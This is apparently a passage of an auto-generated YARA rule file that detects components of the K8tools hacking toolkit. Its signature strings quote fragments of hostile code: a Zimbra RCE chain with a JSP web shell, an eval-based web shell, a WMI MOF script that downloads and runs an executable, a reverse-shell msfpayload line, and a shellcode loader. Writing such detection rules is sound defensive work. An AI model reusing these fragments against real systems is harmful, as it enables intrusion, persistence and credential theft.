      $s5 = "System.DateTime AdjustedTime = entry._LastModified - new System.TimeSpan(1, 0, 0);" fullword ascii /* score: '22.00'*/
      $s6 = "Console.WriteLine(\"{0}: truncating dump from {1} to {2} bytes...\", TargetFile, _FileData.Length," fullword ascii /* score: '20.00'*/
      $s7 = "Console.WriteLine(\"{0}: truncating dump from {1} to {2} bytes...\", TargetFile, _FileData.Length, n);" fullword ascii /* score: '20.00'*/
      $s8 = "if (_Debug) System.Console.WriteLine(\"\\ninserting filename into CDS: (length= {0})\", Header.Length - 30);" fullword ascii /* score: '20.00'*/
      $s9 = "return 100 * (1.0 - (1.0 * CompressedSize) / (1.0 * UncompressedSize));" fullword ascii /* score: '17.00'*/
      $s10 = "if (!System.IO.Directory.Exists(TargetFile))" fullword ascii /* score: '17.00'*/
      $s11 = "if (!System.IO.Directory.Exists(System.IO.Path.GetDirectoryName(TargetFile)))" fullword ascii /* score: '17.00'*/
      $s12 = "Console.WriteLine(\"{0}: memstream.Position: {1}\", TargetFile, memstream.Position);" fullword ascii /* score: '17.00'*/
      $s13 = "System.IO.File.SetLastWriteTime(TargetFile, LastModified);" fullword ascii /* score: '17.00'*/
      $s14 = "System.IO.File.SetLastWriteTime(TargetFile, AdjustedLastModified);" fullword ascii /* score: '17.00'*/
      $s15 = "System.IO.Directory.CreateDirectory(TargetFile);" fullword ascii /* score: '17.00'*/
      $s16 = "output = new System.IO.FileStream(TargetFile, System.IO.FileMode.CreateNew);" fullword ascii /* score: '17.00'*/
      $s17 = "System.Console.WriteLine(\"\\nAll header data:\");" fullword ascii /* score: '17.00'*/
      $s18 = "System.IO.Directory.CreateDirectory(System.IO.Path.GetDirectoryName(TargetFile));" fullword ascii /* score: '17.00'*/
      $s19 = "for (j = 0; j < Header.Length - 30; j++)" fullword ascii /* score: '17.00'*/
      $s20 = "Console.WriteLine(\"{0}: _FileData.Length= {1}\", TargetFile, _FileData.Length);" fullword ascii /* score: '17.00'*/
   condition:
      uint16(0) == 0xbbef and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule MS16_016______EXP_K8_ {
   meta:
      description = "K8tools - file MS16-016提权EXP[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "ace90127e9355ebd50352432ac7c58ba7de5c31b24d235af0a1d94cb7587559a"
   strings:
      $x1 = "ms16-016_win7\\Shellcode.dll" fullword ascii /* score: '34.00'*/
      $s2 = "ms16-016_win7\\EoP.exe" fullword ascii /* score: '16.00'*/
      $s3 = ";~79$=/^$" fullword ascii /* score: '9.00'*/ /* hex encoded string 'y' */
      $s4 = ">nD5:{i:\\.:#" fullword ascii /* score: '7.17'*/
      $s5 = "9UGJ* a" fullword ascii /* score: '5.00'*/
      $s6 = "ms16-016_win7" fullword ascii /* score: '5.00'*/
      $s7 = "MS16-016" fullword ascii /* score: '5.00'*/
      $s8 = "DFMf PS" fullword ascii /* score: '4.00'*/
      $s9 = ".jNo+g/Of" fullword ascii /* score: '4.00'*/
      $s10 = "GzecoWb" fullword ascii /* score: '4.00'*/
      $s11 = "I+2LwMP\\r" fullword ascii /* score: '4.00'*/
      $s12 = "MxDb36N5" fullword ascii /* score: '4.00'*/
      $s13 = "QPNF/|F" fullword ascii /* score: '4.00'*/
      $s14 = "gawl>a<" fullword ascii /* score: '4.00'*/
      $s15 = "GmzZa 22B" fullword ascii /* score: '4.00'*/
      $s16 = "vYMiU:b" fullword ascii /* score: '4.00'*/
      $s17 = "EXP[K8].png" fullword ascii /* score: '4.00'*/
      $s18 = "jxyT#Zk" fullword ascii /* score: '4.00'*/
      $s19 = "G}kaCW\"P" fullword ascii /* score: '4.00'*/
      $s20 = "ZqDpOQ>fvB" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 400KB and
      1 of ($x*) and 4 of them
}

rule Zimbra_Rce {
   meta:
      description = "K8tools - file Zimbra_Rce.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b351e66c9a6bfba5e5bd8fac1af0ec71435b2223e7353b5c6023f5726b7153f4"
   strings:
      $x1 = "fileContent = r'<%@page import=\"java.io.*\"%><%@page import=\"sun.misc.BASE64Decoder\"%><%try {String cmd = request.getParamete" ascii /* score: '42.00'*/
      $x2 = "r = requests.post(base_url+\"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap\",data=auth_body.format(xmlns=\"urn" ascii /* score: '33.00'*/
      $s3 = "r = requests.post(base_url+\"/service/proxy?target=https://127.0.0.1:7071/service/admin/soap\",data=auth_body.format(xmlns=\"urn" ascii /* score: '28.00'*/
      $s4 = "= Runtime.getRuntime().exec(xxcmd);InputStream in = child.getInputStream();out.print(\"->|\");int c;while ((c = in.read()) != -1" ascii /* score: '28.00'*/
      $s5 = "#print(\"Connect \\\"shell.jsp\\\" using K8fly CmdShell\\nBecause the CMD parameter is encrypted using Base64(bypass WAF)\")" fullword ascii /* score: '27.00'*/
      $s6 = "r = requests.post(base_url+\"/service/extension/clientUploader/upload\",files=f,headers=headers,verify=False)" fullword ascii /* score: '23.00'*/
      $s7 = "<userAgent name=\"ZimbraWebClient - SAF3 (Win)\" version=\"5.0.15_GA_2851.RHEL5_64\"/>" fullword ascii /* score: '23.00'*/
      $s8 = "pattern_password = re.compile(r\"&lt;key name=(\\\"|&quot;)zimbra_ldap_password(\\\"|&quot;)&gt;\\n.*?&lt;value&gt;(.*?)&lt;\\/v" ascii /* score: '22.00'*/
      $s9 = "pattern_password = re.compile(r\"&lt;key name=(\\\"|&quot;)zimbra_ldap_password(\\\"|&quot;)&gt;\\n.*?&lt;value&gt;(.*?)&lt;\\/v" ascii /* score: '22.00'*/
      $s10 = "fileContent = r'<%@page import=\"java.io.*\"%><%@page import=\"sun.misc.BASE64Decoder\"%><%try {String cmd = request.getParamete" ascii /* score: '22.00'*/
      $s11 = "#Because the CMD parameter is encrypted using Base64(bypass WAF)" fullword ascii /* score: '21.00'*/
      $s12 = "r=requests.post(base_url+\"/service/soap\",data=auth_body.format(xmlns=\"urn:zimbraAccount\",username=username,password=password" ascii /* score: '20.00'*/
      $s13 = "r=requests.post(base_url+\"/service/soap\",data=auth_body.format(xmlns=\"urn:zimbraAccount\",username=username,password=password" ascii /* score: '20.00'*/
      $s14 = "r = s.get(base_url+\"/downloads/\"+filename,verify=False,headers=headers)" fullword ascii /* score: '18.00'*/
      $s15 = "mbraAdmin\",username=username,password=password),headers=headers,verify=False)" fullword ascii /* score: '17.42'*/
      $s16 = "print(\"[*] Get User Name/Password By XXE \")" fullword ascii /* score: '17.00'*/
      $s17 = "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a\">" fullword ascii /* score: '17.00'*/
      $s18 = "pattern_name = re.compile(r\"&lt;key name=(\\\"|&quot;)zimbra_user(\\\"|&quot;)&gt;\\n.*?&lt;value&gt;(.*?)&lt;\\/value&gt;\")" fullword ascii /* score: '17.00'*/
      $s19 = "# SSRF+Get Admin_Token Stage" fullword ascii /* score: '16.00'*/
      $s20 = "+dir+\"[E]\");}byte[] binary = BASE64Decoder.class.newInstance().decodeBuffer(cmd);String xxcmd = new String(binary);Process chi" ascii /* score: '16.00'*/
   condition:
      uint16(0) == 0x6323 and filesize < 10KB and
      1 of ($x*) and 4 of them
}

rule bypassUACexe_0419_K8_ {
   meta:
      description = "K8tools - file bypassUACexe_0419[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "43a92a01f63a4c475fe6d537f1c4c9fb15584ca29b68a8738cef7d46d650a700"
   strings:
      $s1 = "bypassUACexe\\bypassUACexe.exe" fullword ascii /* score: '26.42'*/
      $s2 = "bypassUACexe\\" fullword ascii /* score: '15.00'*/
      $s3 = "bypassUACexe" fullword ascii /* score: '15.00'*/
      $s4 = "E:\"O*:5W" fullword ascii /* score: '7.00'*/
      $s5 = "8qw#(g+ H" fullword ascii /* score: '5.00'*/
      $s6 = "rSTLLcs6" fullword ascii /* score: '5.00'*/
      $s7 = "-LvLV$N'_" fullword ascii /* score: '4.00'*/
      $s8 = ",mXReOZ?{" fullword ascii /* score: '4.00'*/
      $s9 = "ZHEY+Wn" fullword ascii /* score: '4.00'*/
      $s10 = "fqYpRT'/" fullword ascii /* score: '4.00'*/
      $s11 = "M9!zPHd|)!" fullword ascii /* score: '4.00'*/
      $s12 = "{Vgwh3~jh" fullword ascii /* score: '4.00'*/
      $s13 = "WEbA^]R7" fullword ascii /* score: '4.00'*/
      $s14 = "uWUjV`!pI" fullword ascii /* score: '4.00'*/
      $s15 = "(9GEfg=2j" fullword ascii /* score: '4.00'*/
      $s16 = "G.NVg*" fullword ascii /* score: '4.00'*/
      $s17 = "mFIt3p#\\>" fullword ascii /* score: '4.00'*/
      $s18 = "%f-4ue" fullword ascii /* score: '3.50'*/
      $s19 = "Lkkfis" fullword ascii /* score: '3.00'*/
      $s20 = "kGvgj3" fullword ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 300KB and
      8 of them
}

rule k8downexec {
   meta:
      description = "K8tools - file k8downexec.mof"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "b98f67a529e1592af9751e502eb35e45c8ea8d2e790114f5b179da9c764ffb76"
   strings:
      $x1 = "ScriptText =\"Set Post = CreateObject(\\\"Msxml2.XMLHTTP\\\")\\nSet Shell = CreateObject(\\\"Wscript.Shell\\\")\\nPost.Open \\\"" ascii /* score: '48.00'*/
      $x2 = "aGet.Write(Post.responseBody)\\naGet.SaveToFile \\\"C:\\\\WINDOWS\\\\Temp\\\\ftp.exe\\\",2\\nShell.Run (\\\"C:\\\\WINDOWS\\\\Tem" ascii /* score: '37.00'*/
      $s3 = "ScriptText =\"Set Post = CreateObject(\\\"Msxml2.XMLHTTP\\\")\\nSet Shell = CreateObject(\\\"Wscript.Shell\\\")\\nPost.Open \\\"" ascii /* score: '23.00'*/
      $s4 = "//192.168.85.130/k8.exe\\\",0\\nPost.Send()\\nSet aGet = CreateObject(\\\"ADODB.Stream\\\")\\naGet.Mode = 3\\naGet.Type = 1\\naG" ascii /* score: '21.00'*/
      $s5 = "#pragma namespace(\"\\\\\\\\.\\\\root\\\\subscription\")" fullword ascii /* score: '15.00'*/
      $s6 = "\"And TargetInstance.Second = 5\";" fullword ascii /* score: '14.00'*/
      $s7 = "\"Where TargetInstance Isa \\\"Win32_LocalTime\\\" \"" fullword ascii /* score: '13.03'*/
      $s8 = "ScriptingEngine = \"VBScript\";" fullword ascii /* score: '10.01'*/
      $s9 = "instance of ActiveScriptEventConsumer as $Consumer" fullword ascii /* score: '10.01'*/
      $s10 = "instance of __FilterToConsumerBinding" fullword ascii /* score: '7.01'*/
      $s11 = "EventNamespace = \"Root\\\\Cimv2\";" fullword ascii /* score: '7.00'*/
      $s12 = "Filter = $EventFilter;" fullword ascii /* score: '4.17'*/
      $s13 = "QueryLanguage = \"WQL\";" fullword ascii /* score: '4.01'*/
      $s14 = "instance of __EventFilter as $EventFilter" fullword ascii /* score: '4.01'*/
      $s15 = "Name = \"consPCSV2\";" fullword ascii /* score: '4.01'*/
      $s16 = "Name  = \"filtP2\";" fullword ascii /* score: '4.00'*/
      $s17 = "Query = \"Select * From __InstanceModificationEvent \"" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x7023 and filesize < 2KB and
      1 of ($x*) and 4 of them
}

rule shellcode {
   meta:
      description = "K8tools - file shellcode.aspx"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "7f002f46e18515525fcd1b910de78bb9b1416500636c8ad3d8a3821837c672d3"
   strings:
      $x1 = "//msfpayload windows/shell_reverse_tcp LHOST=192.168.1.115 LPORT=53 X C" fullword ascii /* score: '31.00'*/
      $s2 = "[DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualFree\")]" fullword ascii /* score: '19.00'*/
      $s3 = "[DllImport(\"Kernel32.dll\", EntryPoint = \"VirtualAlloc\")]" fullword ascii /* score: '19.00'*/
      $s4 = "= Marshal.GetDelegateForFunctionPointer(handle, typeof(MsfpayloadProc)) as MsfpayloadProc;" fullword ascii /* score: '18.00'*/
      $s5 = "const uint PAGE_EXECUTE_READWRITE = 0x40;" fullword ascii /* score: '14.17'*/
      $s6 = "PAGE_EXECUTE_READWRITE);" fullword ascii /* score: '14.00'*/
      $s7 = "MsfpayloadProc msfpayload" fullword ascii /* score: '13.00'*/
      $s8 = "delegate int MsfpayloadProc();" fullword ascii /* score: '13.00'*/
      $s9 = "msfpayload();" fullword ascii /* score: '13.00'*/
      $s10 = "public static extern bool VirtualFree(IntPtr address, int size, uint freeType);" fullword ascii /* score: '10.00'*/
      $s11 = "public static extern IntPtr VirtualAlloc(IntPtr address, int size, uint allocType, uint protect);" fullword ascii /* score: '10.00'*/
      $s12 = "<script runat=\"server\">" fullword ascii /* score: '10.00'*/
      $s13 = "<%@ Import Namespace=\"System.Runtime.InteropServices\" %>" fullword ascii /* score: '10.00'*/
      $s14 = "<%@ Page Language=\"C#\" AutoEventWireup=\"true\" Inherits=\"System.Web.UI.Page\" %>" fullword ascii /* score: '10.00'*/
      $s15 = "const uint MEM_COMMIT = 0x1000;" fullword ascii /* score: '7.17'*/
      $s16 = "MEM_COMMIT | MEM_RESERVE," fullword ascii /* score: '7.00'*/
      $s17 = "Marshal.Copy(codeBytes, 0, handle, codeBytes.Length);" fullword ascii /* score: '7.00'*/
      $s18 = "codeBytes.Length," fullword ascii /* score: '7.00'*/
      $s19 = "//Windows API " fullword ascii /* score: '4.42'*/
      $s20 = "byte[] codeBytes = {" fullword ascii /* score: '4.17'*/
   condition:
      uint16(0) == 0x253c and filesize < 9KB and
      1 of ($x*) and 4 of them
}

rule K8_______________ {
   meta:
      description = "K8tools - file K8注册表跳转.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "79287d5264d81bc40b9474faf0cce368e300eaf7efe0ddfea6e74f3b2321c930"
   strings:
      $s1 = "$.pas$,r+$\\lib\\sysconst.$,$\"$+r+$\\bin\\dcc32.exe\" $);end;RegCloseKey(k);end; end;" fullword ascii /* score: '19.00'*/
      $s2 = "HHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon" fullword ascii /* score: '19.00'*/
      $s3 = "FHKEY_CURRENT_USER\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows" fullword ascii /* score: '18.00'*/
      $s4 = "QHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" fullword ascii /* score: '16.00'*/
      $s5 = "CHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce" fullword ascii /* score: '16.00'*/
      $s6 = "GHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServices" fullword ascii /* score: '16.00'*/
      $s7 = "EHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx" fullword ascii /* score: '16.00'*/
      $s8 = "?HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" fullword ascii /* score: '16.00'*/
      $s9 = "KHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunServicesOnce" fullword ascii /* score: '16.00'*/
      $s10 = "wShowWindow:=SW_HIDE;b:=CreateProcess(nil,pchar(e+$\"$+d+$pas\"$),0,0,false,0,0,0," fullword ascii /* score: '15.17'*/
      $s11 = "f,p);if b then WaitForSingleObject(p.hProcess,INFINITE);MoveFile(pchar(d+$bak$)," fullword ascii /* score: '15.00'*/
      $s12 = "\\bin\\dcc32.exe\" " fullword ascii /* score: '14.42'*/
      $s13 = "Unable to insert a line Clipboard does not support Icons/Menu '%s' is already being used by another form" fullword wide /* score: '13.00'*/
      $s14 = "h:cardinal;f:STARTUPINFO;p:PROCESS_INFORMATION;b:boolean;t1,t2,t3:FILETIME;begin" fullword ascii /* score: '11.00'*/
      $s15 = "EComponentError$)A" fullword ascii /* score: '10.00'*/
      $s16 = "0,0);  if  h=DWORD(-1) then exit; GetFileTime(h,@t1,@t2,@t3); CloseHandle(h);h:=" fullword ascii /* score: '9.00'*/
      $s17 = "DHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce" fullword ascii /* score: '9.00'*/
      $s18 = "HHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunServices" fullword ascii /* score: '9.00'*/
      $s19 = "7#7'787_7" fullword ascii /* score: '9.00'*/ /* hex encoded string 'wxw' */
      $s20 = "RHKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer\\Run" fullword ascii /* score: '9.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      ( pe.imphash() == "cf5181f840fa051104a1ce101b48af0c" or 8 of them )
}

rule MS15_077_____________K8_ {
   meta:
      description = "K8tools - file MS15-077提权工具[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "af187153fd0bb2632b96ab8f5407286d23b4a8d74a056693feaa1a62dad59c58"
   strings:
      $s1 = "ms15-077_exp.exe" fullword ascii /* score: '20.00'*/
      $s2 = "ms15-077_upx.exe" fullword ascii /* score: '20.00'*/
      $s3 = "ms15-077.png" fullword ascii /* score: '8.00'*/
      $s4 = "- *t?A" fullword ascii /* score: '5.00'*/
      $s5 = "pSTe.W " fullword ascii /* score: '4.42'*/
      $s6 = ".tiB@:K" fullword ascii /* score: '4.00'*/
      $s7 = "ripk?|" fullword ascii /* score: '4.00'*/
      $s8 = "sXnH_V]" fullword ascii /* score: '4.00'*/
      $s9 = "GRqeW6B7" fullword ascii /* score: '4.00'*/
      $s10 = "9aMyz8[Mo" fullword ascii /* score: '4.00'*/
      $s11 = "IiOeV./O" fullword ascii /* score: '4.00'*/
      $s12 = "NlJfk7R" fullword ascii /* score: '4.00'*/
      $s13 = "RjiB.HA" fullword ascii /* score: '4.00'*/
      $s14 = "xLgh74R" fullword ascii /* score: '4.00'*/
      $s15 = "Ujcq0\"" fullword ascii /* score: '4.00'*/
      $s16 = "SfMsr-o" fullword ascii /* score: '4.00'*/
      $s17 = "vRMA[&x>" fullword ascii /* score: '4.00'*/
      $s18 = "`TQBA!t" fullword ascii /* score: '4.00'*/
      $s19 = "^S.KZe&" fullword ascii /* score: '4.00'*/
      $s20 = "nrga?@" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 600KB and
      8 of them
}

rule K8__________________________________________ {
   meta:
      description = "K8tools - file K8迅雷、快车、旋风地址互换工具.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "4097e04c7176bb6dd4c2ab8b49d73ee568de48ee864f76124f120be68bc304b0"
   strings:
      $s1 = "http://hi.baidu.com/qhack8" fullword wide /* score: '17.00'*/
      $s2 = ".baidu.com/qhack8" fullword ascii /* score: '14.00'*/
      $s3 = "Flashgets" fullword ascii /* score: '11.00'*/
      $s4 = "\\)5]4|/:" fullword ascii /* score: '10.00'*/ /* hex encoded string 'T' */
      $s5 = "L&_4@[FLASHGET]E" fullword ascii /* score: '9.00'*/
      $s6 = "hgjlkbrfz" fullword ascii /* score: '8.00'*/
      $s7 = "strcpyn" fullword ascii /* score: '8.00'*/
      $s8 = "czrxqju" fullword ascii /* score: '8.00'*/
      $s9 = "?PVERSION" fullword ascii /* score: '7.00'*/
      $s10 = "oB CNotSupportedExc" fullword ascii /* score: '7.00'*/
      $s11 = "SPYnD{" fullword ascii /* score: '6.00'*/
      $s12 = "AY.- F" fullword ascii /* score: '5.00'*/
      $s13 = "HEaNRX5" fullword ascii /* score: '5.00'*/
      $s14 = "qNuvwxyz01" fullword ascii /* score: '5.00'*/
      $s15 = "|Yn%P%^A" fullword ascii /* score: '5.00'*/
      $s16 = "ohjmnp" fullword ascii /* score: '5.00'*/
      $s17 = ",?? /f]n" fullword ascii /* score: '5.00'*/
      $s18 = "cmiltf" fullword ascii /* score: '5.00'*/
      $s19 = "ddress" fullword ascii /* score: '5.00'*/
      $s20 = "DjOienWR7" fullword ascii /* score: '5.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      ( pe.imphash() == "c3b39576ee50a54cb512992bf1d9062e" or 8 of them )
}

rule K8tools__git_logs_HEAD {
   meta:
      description = "K8tools - file HEAD"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "65b57bbd6c5e4253942f58014bb1d7890c53db3bde96184eba7d01b54c8f3e90"
   strings:
      $s1 = "clone: from https://github.com/k8gege/K8tools" fullword ascii /* score: '17.00'*/
      $s2 = "al-Platform.(none)> 1589916685 +0300" fullword ascii /* score: '4.42'*/
      $s3 = "0deaa0edd05d9c3f4c7ca738edd135efa4ebc589" ascii /* score: '2.00'*/
   condition:
      uint16(0) == 0x3030 and filesize < 1KB and
      all of them
}

rule K8tools_iislpe {
   meta:
      description = "K8tools - file iislpe.exe"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "73b9cf0e64be1c05a70a9f98b0de4925e62160e557f72c75c67c1b8922799fc4"
   strings:
      $s1 = "Potato.exe" fullword wide /* score: '22.00'*/
      $s2 = "constructor or from DllMain." fullword ascii /* score: '9.00'*/
      $s3 = "+ *8G*<`" fullword ascii /* score: '5.00'*/
      $s4 = "\\UqziJVe" fullword ascii /* score: '5.00'*/
      $s5 = "gmphqm" fullword ascii /* score: '5.00'*/
      $s6 = "16- g?" fullword ascii /* score: '5.00'*/
      $s7 = "B|BxBtBpBlBhBdB`B\\BXBTBPBLBHBDB@B<B8B4B0B,B(B$B B" fullword wide /* score: '4.00'*/
      $s8 = "IIS Priviledge by k8gege" fullword wide /* score: '4.00'*/
      $s9 = "qWfz6f}(" fullword ascii /* score: '4.00'*/
      $s10 = "9EOGV9Ij" fullword ascii /* score: '4.00'*/
      $s11 = "RSDS%?t" fullword ascii /* score: '4.00'*/
      $s12 = "RNKre9l8NR" fullword ascii /* score: '4.00'*/
      $s13 = "fFIV!]\"" fullword ascii /* score: '4.00'*/
      $s14 = "hhku~Ay" fullword ascii /* score: '4.00'*/
      $s15 = "QWLy\"`+" fullword ascii /* score: '4.00'*/
      $s16 = "V^kpfpRkC[" fullword ascii /* score: '4.00'*/
      $s17 = "twib13O" fullword ascii /* score: '4.00'*/
      $s18 = "oGpe=Sk" fullword ascii /* score: '4.00'*/
      $s19 = "PZdiyY|" fullword ascii /* score: '4.00'*/
      $s20 = "{PyJbe5y" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x5a4d and filesize < 1000KB and
      ( pe.imphash() == "9dd8c0ff4fc84287e5b766563240f983" or 8 of them )
}

rule K8____________UA_______________ {
   meta:
      description = "K8tools - file K8飞刀专用UA一句话木马.asxp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "41174de830bc91497736f964a161641fb9ed8087b0bb6a3ef4e48cae649650ef"
   strings:
      $s1 = "<%@ Page Language=\"Jscript\" %><%var pwd=\"tom\";var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf(\"===\"))== p" ascii /* score: '18.00'*/
      $s2 = "<%@ Page Language=\"Jscript\" %><%var pwd=\"tom\";var uastr=Request.UserAgent;if (uastr.Substring(0, uastr.IndexOf(\"===\"))== p" ascii /* score: '18.00'*/
      $s3 = "ar code=uastr.Replace(pwd+\"===\",\"\");eval(code,\"unsafe\"); };%>" fullword ascii /* score: '4.00'*/
   condition:
      uint16(0) == 0x253c and filesize < 1KB and
      all of them
}

rule ___NET___________________20140511_K8_ {
   meta:
      description = "K8tools - file 无NET添加用户提权_20140511[K8].rar"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "0f686024627fed6cf2e83f2756ef7950a202e7c81c59695b88900d17546ac242"
   strings:
      $s1 = "_K8\\NotNetAddUser.exe" fullword ascii /* score: '18.42'*/
      $s2 = "uuuuuuWuuw" fullword ascii /* score: '4.00'*/
      $s3 = "UUUUUUUUR" fullword ascii /* score: '3.00'*/ /* Goodware String - occured 2 times */
      $s4 = "0uq3e5-\\Na*" fullword ascii /* score: '1.17'*/
      $s5 = "> bAf%" fullword ascii /* score: '1.00'*/
      $s6 = "+)'G;[" fullword ascii /* score: '1.00'*/
      $s7 = ",;jUL5" fullword ascii /* score: '1.00'*/
      $s8 = "igN#B{Q" fullword ascii /* score: '1.00'*/
      $s9 = ">b%@8~#" fullword ascii /* score: '1.00'*/
      $s10 = "(4w7f3" fullword ascii /* score: '1.00'*/
      $s11 = "K\\kF|uBT" fullword ascii /* score: '1.00'*/
      $s12 = "xu-k6t" fullword ascii /* score: '1.00'*/
      $s13 = "i2x:9YNZ" fullword ascii /* score: '1.00'*/
      $s14 = "m2';4C" fullword ascii /* score: '1.00'*/
      $s15 = "!gl|8Al" fullword ascii /* score: '1.00'*/
      $s16 = ",WO4>@" fullword ascii /* score: '1.00'*/
      $s17 = "1s>b1}" fullword ascii /* score: '1.00'*/
      $s18 = "o@O}-_" fullword ascii /* score: '1.00'*/
      $s19 = "#tm[$nX" fullword ascii /* score: '1.00'*/
      $s20 = "/kWMJ})" fullword ascii /* score: '1.00'*/
   condition:
      uint16(0) == 0x6152 and filesize < 50KB and
      8 of them
}

rule cve_2019_0604_exp {
   meta:
      description = "K8tools - file cve-2019-0604-exp.py"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2020-05-19"
      hash1 = "1a154bf4f57c2212ae129888846479a611f3a13f1b772f961bf7772bead1d665"
   strings:
      $s1 = "#\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/53" ascii /* score: '17.00'*/
      $s2 = "#\"User-Agent\": \"Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/5" fullword ascii /* score: '17.00'*/
      $s3 = "response = requests.get(shellurl, headers=headers, timeout=5)" fullword ascii /* score: '17.00'*/
      $s4 = "003500560027006700560027" ascii /* score: '17.00'*/ /* hex encoded string '5V'gV'' */
      $s5 = "002000200020002000200020" ascii /* score: '17.00'*/ /* hex encoded string '      ' */
      $s6 = "if response.content=='UAshell':" fullword ascii /* score: '14.00'*/
      $s7 = "'__EVENTTARGET':''," fullword ascii /* score: '14.00'*/
      $s8 = "print exp+'\\n'+payload5" fullword ascii /* score: '13.00'*/
      $s9 = "payload5='\\x23\\x64\\x61\\x74\\x65\\x3A\\x20\\x32\\x30\\x31\\x39\\x30\\x36\\x32\\x36\\x20\\x23\\x61\\x75\\x74\\x68\\x6F\\x72\\x" ascii /* score: '13.00'*/
      $s10 = "payload4='\\x74\\x6F\\x6D\\x3D\\x3D\\x3D\\x52\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\\x2E\\x57\\x72\\x69\\x74\\x65\\x28\\x22\\x55\\x" ascii /* score: '13.00'*/
      $s11 = "uapay: payload4," fullword ascii /* score: '13.00'*/
      $s12 = "paySpanData:payload1+'4700440016004700160005002700f60067009600460056002700c200020005002700560037005600e6004700160047009600f600e6" ascii /* score: '13.00'*/
      $s13 = "payload2='\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x36\\x37\\x30\\x30\\x35\\x36\\x30\\x" ascii /* score: '13.00'*/
      $s14 = "payload4='\\x74\\x6F\\x6D\\x3D\\x3D\\x3D\\x52\\x65\\x73\\x70\\x6F\\x6E\\x73\\x65\\x2E\\x57\\x72\\x69\\x74\\x65\\x28\\x22\\x55\\x" ascii /* score: '13.00'*/
      $s15 = "payload3='\\x61\\x33\\x30\\x30\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x30\\x35\\x36\\x30\\x" ascii /* score: '13.00'*/
      $s16 = "payload2='\\x38\\x37\\x30\\x30\\x64\\x36\\x30\\x30\\x63\\x36\\x30\\x30\\x30\\x32\\x30\\x30\\x36\\x37\\x30\\x30\\x35\\x36\\x30\\x" ascii /* score: '13.00'*/
      $s17 = "009300330043005600030083009300a300c300f300'+payload2+'5600c300f200d400560047008600f6004600e4001600d6005600e300d000a0000200020002" ascii /* score: '13.00'*/
      $s18 = "payload5='\\x23\\x64\\x61\\x74\\x65\\x3A\\x20\\x32\\x30\\x31\\x39\\x30\\x36\\x32\\x36\\x20\\x23\\x61\\x75\\x74\\x68\\x6F\\x72\\x" ascii /* score: '13.00'*/
      $s19 = "payload1='\\x5F\\x5F\\x62\\x70\\x38\\x32\\x63\\x31\\x33\\x35\\x30\\x30\\x39\\x37\\x30\\x30\\x33\\x37\\x30\\x30\\x34\\x37\\x30\\x" ascii /* score: '13.00'*/
